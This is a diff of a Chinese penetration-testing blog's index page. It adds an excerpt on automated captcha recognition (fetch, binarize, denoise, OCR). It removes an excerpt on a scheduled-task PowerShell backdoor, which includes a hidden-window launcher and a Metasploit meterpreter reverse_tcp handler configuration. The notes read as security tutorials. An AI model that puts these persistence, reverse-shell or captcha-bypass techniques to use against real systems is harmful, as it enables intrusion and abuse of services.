@@ -117,6 +117,204 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/09/26/VerifyCode.html" >验证码识别</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-09-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>先灰度处理</p>
+<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
+img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
+img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后是二值化, 二值化处理之后，投影</p>
+<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;
+
+for i in range(20):
+	imgfile &#x3D; str(i) + &#39;.jpg&#39;
+	req &#x3D; requests.get(url)
+	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
+	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
+	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
+<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
+<p>我们这里使用8邻域算法。</p>
+<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
+from PIL import Image
+import os
+import re
+import pytesseract
+
+def binarizing(img, threshold):
+   img &#x3D; img.convert(&quot;L&quot;)
+   pixdata &#x3D; img.load()
+   w, h &#x3D; img.size
+   for y in range(h):
+      for x in range(w):
+         if pixdata[x, y] &lt; threshold:
+            pixdata[x, y] &#x3D; 0
+         else:
+            pixdata[x, y] &#x3D; 255
+   return img
+   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)
+
+
+def depoint(img):
+   pixdata &#x3D; img.load()
+   w,h &#x3D; img.size
+   for y in range(1,h-1):
+      for x in range(1, w-1):
+         count &#x3D; 0
+         if pixdata[x, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if count &gt; 4:
+            pixdata[x, y] &#x3D; 255
+   return img
+
+path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
+pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
+images &#x3D; os.listdir(path)
+for image in images:
+   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
+      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
+      b_img &#x3D; binarizing(img, 230)
+      v &#x3D; depoint(b_img)
+      vcode &#x3D; pytesseract.image_to_string(v)
+      matches &#x3D; re.findall(pattern, vcode)
+      filename &#x3D; &#39;&#39;.join(map(str, matches))
+      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
+	
+
+	</div>
+  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>先灰度处理</p>
+<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
+img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
+img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后是二值化, 二值化处理之后，投影</p>
+<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;
+
+for i in range(20):
+	imgfile &#x3D; str(i) + &#39;.jpg&#39;
+	req &#x3D; requests.get(url)
+	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
+	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
+	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
+<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
+<p>我们这里使用8邻域算法。</p>
+<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
+from PIL import Image
+import os
+import re
+import pytesseract
+
+def binarizing(img, threshold):
+   img &#x3D; img.convert(&quot;L&quot;)
+   pixdata &#x3D; img.load()
+   w, h &#x3D; img.size
+   for y in range(h):
+      for x in range(w):
+         if pixdata[x, y] &lt; threshold:
+            pixdata[x, y] &#x3D; 0
+         else:
+            pixdata[x, y] &#x3D; 255
+   return img
+   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)
+
+
+def depoint(img):
+   pixdata &#x3D; img.load()
+   w,h &#x3D; img.size
+   for y in range(1,h-1):
+      for x in range(1, w-1):
+         count &#x3D; 0
+         if pixdata[x, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x-1, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y-1] &gt; 245:
+            count &#x3D; count + 1
+         if pixdata[x+1, y+1] &gt; 245:
+            count &#x3D; count + 1
+         if count &gt; 4:
+            pixdata[x, y] &#x3D; 255
+   return img
+
+path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
+pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
+images &#x3D; os.listdir(path)
+for image in images:
+   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
+      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
+      b_img &#x3D; binarizing(img, 230)
+      v &#x3D; depoint(b_img)
+      vcode &#x3D; pytesseract.image_to_string(v)
+      matches &#x3D; re.findall(pattern, vcode)
+      filename &#x3D; &#39;&#39;.join(map(str, matches))
+      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
+	
+	</div>
+  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/09/12/c0w.html" >C0w</a>
 		</h3>
 		</div>
@@ -819,102 +1017,6 @@ lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/05/24/schtasks定时后门.html" >powershell定时任务后门</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-05-24  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
-<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
-<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
-schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
-schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
-schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
-<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
-command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
-set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
-shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>msf接收多个shell可以如下这样做：</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
-set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
-set LHOST 192.168.1.117
-set LPORT 31337
-set ExitOnSession false
-exploit -j -z
-
-或者上面的保存为listener.rc，然后msfconsole启动
-msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>XML文件如下:</p>
-	
-
-	</div>
-  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
-<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
-<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
-schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
-schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
-schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
-<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
-command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
-set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
-shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>msf接收多个shell可以如下这样做：</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
-set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
-set LHOST 192.168.1.117
-set LPORT 31337
-set ExitOnSession false
-exploit -j -z
-
-或者上面的保存为listener.rc，然后msfconsole启动
-msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>XML文件如下:</p>
-	
-	</div>
-  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -972,7 +1074,7 @@ msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-row
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -993,6 +1095,10 @@ msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-row
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
       </li>
     
@@ -1006,10 +1112,6 @@ msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-row
     
       <li>
         <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
       </li>
     
   </ul>
